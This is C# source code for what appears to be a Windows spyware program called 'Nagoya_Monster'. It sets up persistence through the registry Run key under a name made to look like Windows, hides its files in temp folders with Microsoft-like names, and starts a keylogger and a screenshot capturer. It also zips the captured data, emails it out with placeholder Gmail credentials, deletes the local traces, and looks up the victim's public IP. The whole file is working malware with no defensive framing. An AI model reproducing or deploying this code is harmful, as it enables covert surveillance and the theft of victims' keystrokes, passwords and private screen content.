using System;
using System.IO;
using System.IO.Compression;
using System.Net;

namespace Nagoya_Monster
{
    class Program
    {
        public static string TempPath = Path.GetTempPath() + @"MicrosoftRoyal\";
        public static string LogPath = TempPath + "ToolboxVersion.dat";
        public static string SSPath = TempPath + @"TaskRunnerExplorer\";
        public static string ZipPath = Path.GetTempPath() + "MicrosoftRoyal.zip";
        public static string EmailUser = "example@gmail.com";
        public static string EmailPass = "EmailPassword";

        public static void Main(string[] args)
        {
            Program prg = new Program();
            prg.Start();
        }

        public void Start()
        {
            Setup();
            StartDeamons();
        }

        private static void StartDeamons()
        {
            Keylog.Start();
            Screenshot.Start();
        }

        private static void Setup()
        {
            RegistrerStartup();
            CreateFolders();
            UploadLogs();
        }

        private static void RegistrerStartup()
        {
            Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows Royal", System.Reflection.Assembly.GetExecutingAssembly().Location);
        }

        private static void CreateFolders()
        {
            if (!Directory.Exists(SSPath))
                Directory.CreateDirectory(SSPath);
        }

        private static void UploadLogs()
        {
            if (!IsConnectedToInternet())
                return;

            try
            {
                if (File.Exists(ZipPath))
                    File.Delete(ZipPath);

                ZipFile.CreateFromDirectory(TempPath, ZipPath);

                Mail.Send("Logs", ZipPath);

                DirectoryInfo di = new DirectoryInfo(TempPath);

                foreach (FileInfo file in di.GetFiles())
                    file.Delete();

                foreach (DirectoryInfo dir in di.GetDirectories())
                    dir.Delete(true);

                CreateFolders();

                if (File.Exists(ZipPath))
                    File.Delete(ZipPath);
            }
            catch
            {


            }
        }

        public static bool IsConnectedToInternet()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (client.OpenRead("http://clients3.google.com/generate_204"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        public static string GetIpAdress()
        {
            try
            {
                return new WebClient().DownloadString("http://bot.whatismyipaddress.com/");
            }
            catch
            {
                return null;
            }
        }

        public static string GetIpAdress1()
        {
            try
            {
                return new WebClient().DownloadString("http://ipinfo.io/ip");
            }
            catch
            {
                return null;
            }
        }
    }
}
